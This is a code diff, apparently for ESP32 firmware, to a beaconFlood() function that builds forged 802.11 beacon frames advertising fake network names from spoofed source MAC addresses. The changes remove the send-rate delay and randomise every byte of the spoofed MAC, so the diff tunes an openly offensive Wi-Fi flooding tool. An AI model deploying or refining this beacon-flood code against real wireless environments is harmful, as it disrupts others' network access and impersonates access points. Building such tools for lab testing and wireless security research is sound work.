@@ -29,7 +29,7 @@ void beaconFlood() {
   const bool appendSpaces = false; // makes all SSIDs 32 characters long
   uint32_t pkgsPerSSID = 3;
   uint32_t delayMillis = 1;
-  uint32_t pkgsRateMs = 10;
+  uint32_t pkgsRateMs = 0;
 
   #ifndef SSIDS_H
   // SSID list
@@ -90,8 +90,8 @@ void beaconFlood() {
   uint8_t beaconPacket[109] = {
     /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
     /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
-    /* 10 - 15 */ 0x50, 0xAB, 0x12, 0x04, 0x05, 0x06, // Source
-    /* 16 - 21 */ 0x50, 0xAB, 0x12, 0x04, 0x05, 0x06, // Source
+    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
+    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
 
     // Fixed parameters
     /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
@@ -150,7 +150,12 @@ void beaconFlood() {
     for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
     
     // Generate random MAC
-    for (int i = 1; i < 6; i++) macAddr[i] = random(256);
+    do {
+        for (int i = 0; i < 6; i++) {
+          macAddr[i] = random(256); // Random byte
+        }
+        macAddr[0] &= 0xFC; // Clear the lowest two bits: unicast & universally administered
+    } while (macAddr[0] == 0x00); // Prevent all-zero MAC address
     
     // WiFi setup
     WiFi.mode(WIFI_MODE_STA);
@@ -183,7 +188,6 @@ void beaconFlood() {
     int ssidLen = strlen(currentSSID);
     
     // Update MAC
-    // for (int i = 3; i < 6; i++) macAddr[i] = random(256);
     macAddr[5] = random(256);
       
     memcpy(&beaconPacket[10], macAddr, 6);
